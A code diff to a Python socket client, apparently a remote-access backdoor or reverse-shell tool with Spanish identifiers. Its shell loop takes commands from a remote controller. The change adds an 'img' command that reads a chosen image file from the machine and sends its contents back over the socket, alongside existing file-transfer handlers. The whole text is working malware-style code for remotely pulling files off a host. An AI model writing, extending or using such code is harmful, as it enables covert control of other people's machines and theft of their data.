@@ -2,6 +2,8 @@ import socket
 import os
 import getpass
 import re
+import pickle
+import struct
 from time import sleep
 from subprocess import Popen, PIPE
 
@@ -35,6 +37,21 @@ class TCP:
         nombre = os.path.abspath(ubicacion)
         nombre = os.path.basename(nombre)
         return nombre
+
+    def isImage(self, ubicacion):
+        ext = [".jpg", ".png", ".jpeg", ".webp"]
+        imagen = False
+        for i in ext:
+            if ubicacion.lower().endswith(i):
+                imagen = True
+                break
+
+        return imagen
+
+    def enviarDatos(self, info):
+        info = pickle.dumps(info)
+        info = struct.pack('Q', len(info))+info
+        self.__sock.sendall(info)
 
     def enviarArchivo(self, ubicacion):
         sleep(0.05)
@@ -103,6 +120,28 @@ class TCP:
             destino = self.__sock.recv(1024).decode()
             self.recibirArchivo(destino)
 
+    def image(self, cmd):
+        if re.search("-t", cmd):
+            imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
+        else:
+            imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+
+        if os.path.isfile(imagen) and self.isImage(imagen):
+            self.__sock.send("ok".encode())
+            sleep(0.05)
+            nombre = self.getNombre(imagen)
+            self.__sock.send(nombre.encode())
+
+            archivo = open(imagen, 'rb')
+            info = archivo.read()
+            archivo.close()
+
+            sleep(0.05)
+            self.enviarDatos(info)
+
+        else:
+            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
+
     def shell(self):
         try:
             while True:
@@ -141,6 +180,13 @@ class TCP:
                 elif cmd.lower()[:3] == "sft":
                     try:
                         self.sendFileTo(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:3] == "img":
+                    try:
+                        self.image(cmd)
 
                     except:
                         continue
